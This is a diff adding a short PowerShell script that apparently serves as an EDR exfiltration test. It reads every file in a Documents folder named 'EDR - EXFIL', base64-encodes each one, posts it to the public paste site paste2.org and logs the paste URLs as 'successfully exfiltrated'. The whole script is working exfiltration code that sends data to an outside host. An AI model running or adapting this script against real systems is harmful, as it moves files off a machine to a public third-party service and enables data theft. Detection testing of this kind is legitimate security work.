@@ -1,0 +1,38 @@
+$dir = $env:SystemDrive + $env:HOMEPATH + '\Documents\EDR - EXFIL'
+$files = gci $dir
+$output = $dir + '\output.txt'
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+ForEach ($file in $files)
+{
+    $file = $file.FullName
+
+    Try
+    {
+        $bytes = [System.IO.File]::ReadAllBytes($file)
+        $base64string = [System.Convert]::ToBase64String($bytes)
+
+        $base64string = $base64string.Replace('+', '%2B')
+
+        $request = Invoke-WebRequest https://paste2.org -Method Post -Body "code=$base64string&lang=text&description=&parent=" -OutVariable response
+        
+        If ($request.ParsedHtml.title -match 'Viewing Paste')
+        {
+
+            $id = $request.ParsedHtml.title.Split(' ')[-1]
+            $url = "https://paste2.org/" + $id
+
+            echo "'$file' successfully exfiltrated `nURL: $url" >> $output
+
+        }
+        Else
+        {
+            echo "'$file' - Something went wrong!" >> $output
+        }
+    }
+    Catch
+    {
+        echo "'$File' - Something went wrong! `n$_" >> $output
+    }
+}
